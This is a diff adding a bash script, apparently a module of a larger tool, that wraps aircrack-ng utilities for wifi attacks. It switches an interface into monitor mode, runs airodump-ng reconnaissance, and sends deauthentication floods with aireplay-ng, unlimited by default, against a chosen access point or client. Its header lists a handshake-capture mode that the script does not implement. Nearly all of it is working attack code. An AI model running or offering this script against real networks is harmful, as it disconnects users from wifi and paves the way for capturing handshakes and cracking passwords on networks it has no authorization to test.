@@ -1,0 +1,66 @@
+#!/bin/bash
+#str_op
+#	iface - required
+#	type - required (set the type of the scan you want: recon, deauth, hand_cap)
+#	bssid - required (for all types besides recon)
+#	count - optional (set the number deauth pkg sent, default is until stoped)
+#	client - optional (set a specific client for deauth)
+#end_op
+#str_info
+#	This is a aircrack-ng wrapper made in bash to ease wifi attacks
+#end_info
+
+duth_attk() {
+	mon_md
+	if [[ -z $client && -z $count ]]; then
+		sudo aireplay-ng --deauth 0 -a $bssid $ifacemon
+	elif [[ -n $client && -z $count ]]; then
+		sudo aireplay-ng --deauth 0 -a $bssid -c $client $ifacemon
+	elif [[ -n $client && -n $count ]]; then
+		sudo aireplay-ng --deauth $count -a $bssid -c $client $ifacemon
+	elif [[ -z $client && -n $count ]]; then
+		sudo aireplay-ng --deauth $count -a $bssid $ifacemon
+	fi
+	
+	
+}
+
+rec_attk() {
+	mon_md
+	sudo airodump-ng $ifacemon --manufacturer
+}
+
+mon_md() {
+	mod=$(iwconfig $iface | grep -oP "Mode:\K\S+")
+	if [[ $mod != "Monitor" ]]; then
+		echo "${0}: interface not in monitor mode"
+		echo "${0}: setting interface in monitor mode..."
+		if sudo airmon-ng start $iface > /dev/null 2>&1; then
+			ifacemon=${iface}mon
+		fi
+	else
+		echo "${0}: interface already in monitor mode"
+		echo "${0}: continuing..."
+		ifacemon=$iface
+	fi
+	
+}
+
+
+attk_type() {
+	case "$type" in
+		recon) rec_attk ;;
+		deauth) duth_attk ;;
+	esac
+
+}
+
+if [[ -z $iface ]]; then
+	echo "${0}: interface not set, please set one using set iface <interface>"
+else
+	if iwconfig $iface > /dev/null 2>&1; then
+		attk_type
+	else
+		echo "${0}: interface is set but unavailable or it isn't connected"
+	fi
+fi
